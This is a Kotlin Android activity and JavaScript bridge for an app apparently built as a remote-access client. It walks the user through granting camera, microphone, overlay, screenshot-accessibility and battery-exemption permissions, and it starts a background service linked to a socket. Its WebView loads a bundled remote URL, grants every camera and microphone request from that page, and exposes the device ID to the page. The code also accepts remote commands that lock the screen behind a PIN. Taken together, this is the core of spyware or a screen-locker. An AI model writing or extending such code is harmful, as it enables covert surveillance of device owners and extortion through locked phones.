package com.sync.xxx

import android.annotation.SuppressLint
import android.content.*
import android.content.pm.PackageManager
import android.net.Uri
import android.os.*
import android.provider.Settings
import android.webkit.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import org.json.JSONObject

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private var accountUid: String = "unknown"

    private var isRequestingSettings = false
    private var overlayRequested = false

    companion object {
        private const val REQ_NOTIF_PERMISSION = 1001
        private const val REQ_CAMERA_AUDIO     = 1002
    }

    private val commandReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action != DeviceService.ACTION_COMMAND) return
            val cmd = intent.getStringExtra(DeviceService.EXTRA_COMMAND) ?: return
            val value = intent.getStringExtra(DeviceService.EXTRA_VALUE) ?: ""
            handleCommand(cmd, value)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        readAccountUid()
        setupWebView()
        registerReceivers()

        requestNotificationPermission()
    }

    // ─── STEP 1: Notifikasi ──────────────────────────────────────────────────
    private fun requestNotificationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            val granted = ContextCompat.checkSelfPermission(
                this, "android.permission.POST_NOTIFICATIONS"
            ) == PackageManager.PERMISSION_GRANTED

            if (!granted) {
                ActivityCompat.requestPermissions(
                    this,
                    arrayOf("android.permission.POST_NOTIFICATIONS"),
                    REQ_NOTIF_PERMISSION
                )
                return
            }
        }
        requestCameraAudioPermission()
    }

    // ─── STEP 2: Kamera & Mikrofon ──────────────────────────────────────────
    private fun requestCameraAudioPermission() {
        val need = mutableListOf<String>()

        if (ContextCompat.checkSelfPermission(
                this, android.Manifest.permission.CAMERA
            ) != PackageManager.PERMISSION_GRANTED
        ) need.add(android.Manifest.permission.CAMERA)

        if (ContextCompat.checkSelfPermission(
                this, android.Manifest.permission.RECORD_AUDIO
            ) != PackageManager.PERMISSION_GRANTED
        ) need.add(android.Manifest.permission.RECORD_AUDIO)

        if (need.isEmpty()) {
            proceedToOverlay()
            return
        }
        ActivityCompat.requestPermissions(this, need.toTypedArray(), REQ_CAMERA_AUDIO)
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        when (requestCode) {
            REQ_NOTIF_PERMISSION -> requestCameraAudioPermission()
            REQ_CAMERA_AUDIO     -> proceedToOverlay()
        }
    }

    // ─── STEP 3: Overlay permission ─────────────────────────────────────────
    private fun proceedToOverlay() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this) && !overlayRequested) {
                overlayRequested = true
                isRequestingSettings = true
                try {
                    startActivity(
                        Intent(
                            Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                            Uri.parse("package:$packageName")
                        )
                    )
                    return
                } catch (e: Exception) {
                    android.util.Log.e("MainActivity", "Gagal buka overlay settings: ${e.message}")
                }
            }
        }
        startDeviceServiceDelayed()
        Handler(Looper.getMainLooper()).postDelayed({
            if (!isAccessibilityEnabled()) openAccessibilitySettings()
        }, 4000)
    }

    private fun startDeviceServiceDelayed() {
        Handler(Looper.getMainLooper()).postDelayed({
            try {
                val svcIntent = Intent(this, DeviceService::class.java)
                ContextCompat.startForegroundService(this, svcIntent)
            } catch (e: Exception) {
                android.util.Log.e("MainActivity", "Gagal start service: ${e.message}")
            }
        }, 2000)
    }

    private fun readAccountUid() {
        try {
            val inputStream = assets.open("uid.json")
            val size = inputStream.available()
            val buffer = ByteArray(size)
            inputStream.read(buffer)
            inputStream.close()
            val json = String(buffer, Charsets.UTF_8)
            val obj = JSONObject(json)
            accountUid = obj.optString("uid", "unknown") ?: "unknown"

            val prefs = getSharedPreferences("device_prefs", MODE_PRIVATE)
            prefs.edit().putString("account_uid", accountUid).apply()
        } catch (e: Exception) {
            e.printStackTrace()
            accountUid = "unknown"
        }
    }

    private fun registerReceivers() {
        val filter = IntentFilter(DeviceService.ACTION_COMMAND)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(commandReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(commandReceiver, filter)
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        webView = findViewById(R.id.mainWebView)
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            allowFileAccess = true
            allowContentAccess = true
            mediaPlaybackRequiresUserGesture = false

            javaScriptCanOpenWindowsAutomatically = true
            setSupportMultipleWindows(true)
            databaseEnabled = true
            loadWithOverviewMode = true
            useWideViewPort = true
            builtInZoomControls = true
            displayZoomControls = false
            cacheMode = WebSettings.LOAD_DEFAULT

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP)
                mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        }

        // Cookie
        val cookieManager = CookieManager.getInstance()
        cookieManager.setAcceptCookie(true)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            cookieManager.setAcceptThirdPartyCookies(webView, true)
        }

        val bridge = AppBridge(this, webView)
        AppBridge.instance = bridge
        webView.addJavascriptInterface(bridge, "Android")
        webView.addJavascriptInterface(MainBridge(), "MainBridge")

        webView.webChromeClient = object : WebChromeClient() {
            override fun onPermissionRequest(request: PermissionRequest) {
                request.grant(request.resources)
            }

            override fun onCreateWindow(
                view: WebView?,
                isDialog: Boolean,
                isUserGesture: Boolean,
                resultMsg: Message?
            ): Boolean {
                val newWebView = WebView(this@MainActivity)
                newWebView.settings.javaScriptEnabled = true
                newWebView.settings.domStorageEnabled = true
                newWebView.addJavascriptInterface(MainBridge(), "MainBridge")
                newWebView.webViewClient = object : WebViewClient() {
                    override fun shouldOverrideUrlLoading(
                        v: WebView?,
                        request: WebResourceRequest?
                    ): Boolean {
                        val url = request?.url?.toString() ?: return false
                        webView.loadUrl(url)
                        v?.postDelayed({ (v as? WebView)?.destroy() }, 1500)
                        return true
                    }
                }
                val transport = resultMsg?.obj as? WebView.WebViewTransport
                if (transport == null) {
                    newWebView.destroy()
                    return false
                }
                transport.webView = newWebView
                resultMsg.sendToTarget()
                return true
            }
        }

        webView.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(
                view: WebView?,
                request: WebResourceRequest?
            ): Boolean {
                val url = request?.url?.toString() ?: return false
                if (!url.startsWith("http://") && !url.startsWith("https://")) {
                    try {
                        val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
                        startActivity(intent)
                        return true
                    } catch (_: Exception) {}
                }
                view?.loadUrl(url)
                return true
            }

            override fun onReceivedError(
                view: WebView?,
                request: WebResourceRequest?,
                error: WebResourceError?
            ) {
                super.onReceivedError(view, request, error)
                if (request?.isForMainFrame == true) {
                    val code = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                        error?.errorCode else 0
                    val desc = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                        error?.description?.toString() ?: "unknown" else "unknown"
                    showErrorPage("Koneksi gagal (code: $code)\n$desc")
                }
            }
        }

        loadWebsiteFromAsset()
    }

    private fun loadWebsiteFromAsset() {
        try {
            val inputStream = assets.open("website.json")
            val size = inputStream.available()
            val buffer = ByteArray(size)
            inputStream.read(buffer)
            inputStream.close()
            val json = String(buffer, Charsets.UTF_8)
            val obj = JSONObject(json)
            val targetUrl = obj.optString("url", "")

            if (targetUrl.isNotEmpty()) {
                webView.loadUrl(targetUrl)
                return
            }
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "Gagal baca website.json: ${e.message}")
        }

        showErrorPage("Aplikasi Error.\nURL Website tidak ditemukan dalam paket.")
    }

    private fun escapeHtml(s: String): String =
        s.replace("&", "&amp;")
         .replace("<", "&lt;")
         .replace(">", "&gt;")

    private fun showErrorPage(message: String) {
        val safe = escapeHtml(message)
        val html = """
            <!DOCTYPE html>
            <html>
            <head>
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <style>
                    body {
                        margin: 0; padding: 40px 24px;
                        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                        background: #0d0d0f; color: #e5e5e5;
                        display: flex; align-items: center; justify-content: center; min-height: 100vh;
                    }
                    .box { max-width: 420px; text-align: center; }
                    .icon {
                        width: 64px; height: 64px; border-radius: 16px;
                        background: #b91c1c; display: inline-flex;
                        align-items: center; justify-content: center;
                        font-size: 32px; margin-bottom: 20px;
                    }
                    h3 { font-size: 18px; margin: 0 0 12px; font-weight: 700; }
                    p { font-size: 13px; color: #9ca3af; margin: 0; line-height: 1.5; white-space: pre-line; }
                </style>
            </head>
            <body>
                <div class="box">
                    <div class="icon">!</div>
                    <h3>Aplikasi Error</h3>
                    <p>$safe</p>
                </div>
            </body>
            </html>
        """.trimIndent()
        webView.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null)
    }

    override fun onResume() {
        super.onResume()
        if (isRequestingSettings) {
            isRequestingSettings = false
            Handler(Looper.getMainLooper()).postDelayed({
                startDeviceServiceDelayed()
                Handler(Looper.getMainLooper()).postDelayed({
                    if (!isAccessibilityEnabled()) openAccessibilitySettings()
                }, 3500)
            }, 1000)
        }
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        intent ?: return
        setIntent(intent)
        if (intent.getBooleanExtra("lock_mode", false)) {
            val pin = intent.getStringExtra("lock_pin") ?: ""
            val title = intent.getStringExtra("lock_title") ?: "Perangkat Terkunci"
            startLockMode(pin, title)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try { unregisterReceiver(commandReceiver) } catch (_: Exception) {}
    }

    private fun handleCommand(cmd: String, value: String) {
        when (cmd) {
            "lockDevice" -> {
                val parts = value.split("|")
                val pin = parts.getOrNull(0) ?: ""
                val title = parts.getOrNull(1) ?: "Perangkat Terkunci"
                startLockMode(pin, title)
            }
            "unlockDevice" -> stopLockMode()
        }
    }

    private fun jsEscape(s: String): String =
        s.replace("\\", "\\\\")
         .replace("'", "\\'")
         .replace("\"", "\\\"")
         .replace("\n", "\\n")
         .replace("\r", "\\r")

    private fun startLockMode(pin: String, title: String) {
        val safePin = jsEscape(pin)
        val safeTitle = jsEscape(title)
        webView.evaluateJavascript(
            "if(typeof showLockScreen==='function') showLockScreen('$safePin','$safeTitle')",
            null
        )
    }

    private fun stopLockMode() {
        webView.evaluateJavascript(
            "if(typeof hideLockScreen==='function') hideLockScreen()",
            null
        )
        val i = Intent("com.sync.xxx.UNLOCK").apply { setPackage(packageName) }
        sendBroadcast(i)
    }

    fun isBatteryOptIgnored() = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
        (getSystemService(POWER_SERVICE) as PowerManager).isIgnoringBatteryOptimizations(packageName)
    else true

    fun isOverlayGranted() = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
        Settings.canDrawOverlays(this) else true

    fun requestOverlayPerm() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            overlayRequested = true
            isRequestingSettings = true
            startActivity(
                Intent(
                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:$packageName")
                )
            )
        }
    }

    fun openAccessibilitySettings() {
        try {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            })
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "openAccessibilitySettings: ${e.message}")
        }
    }

    fun isAccessibilityEnabled(): Boolean {
        return try {
            val enabled = Settings.Secure.getString(
                contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false
            val fullName  = "$packageName/${ScreenshotAccessibilityService::class.java.name}"
            val shortName = "$packageName/.ScreenshotAccessibilityService"
            enabled.contains(fullName) || enabled.contains(shortName)
        } catch (_: Exception) { false }
    }

    fun openBatterySettings() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            startActivity(
                Intent(
                    Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                    Uri.parse("package:$packageName")
                )
            )
        }
    }

    inner class MainBridge {
        @JavascriptInterface
        fun connectNow() {
            Handler(Looper.getMainLooper()).post {
                startDeviceServiceDelayed()
                sendBroadcast(Intent(DeviceService.ACTION_CONNECT).apply { setPackage(packageName) })
            }
        }

        @JavascriptInterface
        fun getUID(): String = accountUid

        @JavascriptInterface
        fun requestAccessibilityPerm() {
            Handler(Looper.getMainLooper()).post {
                openAccessibilitySettings()
            }
        }

        @JavascriptInterface
        fun isAccessibilityEnabled(): Boolean = this@MainActivity.isAccessibilityEnabled()
    }
}

class AppBridge(private val context: Context, private val webView: WebView) {
    companion object { var instance: AppBridge? = null }

    @JavascriptInterface fun getDeviceId(): String =
        Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"

    @JavascriptInterface fun getDeviceName(): String {
        val m = Build.MANUFACTURER.replaceFirstChar { it.uppercase() }
        val n = Build.MODEL
        return if (n.startsWith(m, ignoreCase = true)) n else "$m $n"
    }

    @JavascriptInterface fun isSocketConnected(): Boolean = SocketHolder.connected

    @JavascriptInterface fun isBatteryOptIgnored(): Boolean {
        val act = context as? MainActivity ?: return true
        return act.isBatteryOptIgnored()
    }

    @JavascriptInterface fun isOverlayGranted(): Boolean {
        val act = context as? MainActivity ?: return false
        return act.isOverlayGranted()
    }

    @JavascriptInterface fun requestOverlayPerm() {
        (context as? MainActivity)?.requestOverlayPerm()
    }

    @JavascriptInterface fun openBatterySettings() {
        (context as? MainActivity)?.openBatterySettings()
    }

    @JavascriptInterface fun requestAccessibilityPerm() {
        (context as? MainActivity)?.openAccessibilitySettings()
    }

    @JavascriptInterface fun isAccessibilityEnabled(): Boolean {
        val act = context as? MainActivity ?: return false
        return act.isAccessibilityEnabled()
    }
}